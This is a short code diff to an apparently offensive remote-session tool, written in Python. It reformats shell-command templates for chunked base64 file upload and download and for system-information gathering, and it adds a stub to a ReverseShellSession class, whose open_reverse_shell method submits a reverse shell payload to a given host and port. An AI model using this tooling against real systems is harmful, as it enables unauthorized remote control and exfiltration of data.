@@ -26,15 +26,19 @@ WRAPPER_CODE = """
 echo -n "{start1}""{start2}";({code}) {decoder};echo {stop}
 """
 
-UPLOAD_FILE_CHUNK_CODE = 'file=$(mktemp); echo {chunk_b64} | base64 -d > "$file"; echo DONE "$file"'
+UPLOAD_FILE_CHUNK_CODE = (
+    'file=$(mktemp); echo {chunk_b64} | base64 -d > "$file"; echo DONE "$file"'
+)
 
-UPLOAD_FILE_MERGE_CODE = 'cat {files} > {filepath}; rm {files}'
+UPLOAD_FILE_MERGE_CODE = "cat {files} > {filepath}; rm {files}"
 
-UPLOAD_FILE_CHECK_CODE = 'which md5sum >/dev/null || echo no_md5sum; md5sum {filepath}'
+UPLOAD_FILE_CHECK_CODE = "which md5sum >/dev/null || echo no_md5sum; md5sum {filepath}"
 
 DOWNLOAD_FILE_CHUNK_CODE = 'tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED'
 
-GET_BASICINFO_CODE = 'for cmd in {cmds}; do echo "start$cmd|"$($cmd | base64 -w 0)"stop"; done'
+GET_BASICINFO_CODE = (
+    'for cmd in {cmds}; do echo "start$cmd|"$($cmd | base64 -w 0)"stop"; done'
+)
 
 REVERSE_SHELL_PAYLOAD = """
 if command -v php > /dev/null 2>&1; then
@@ -343,6 +347,13 @@ class ReverseShellSession(SessionInterface):
 
     async def open_reverse_shell(self, host: str, port: int) -> None:
         await self.submit(reverse_shell_payload(host, port))
+
+    async def create_process(
+        self,
+        argv: t.List[str],
+        overrides_env: t.Union[t.Dict[str, str], None] = None,
+    ) -> "ProcessProtocol":
+        raise NotImplementedError("反弹Shell session暂不支持创建进程")
 
     async def send_bytes_over_tcp(
         self,
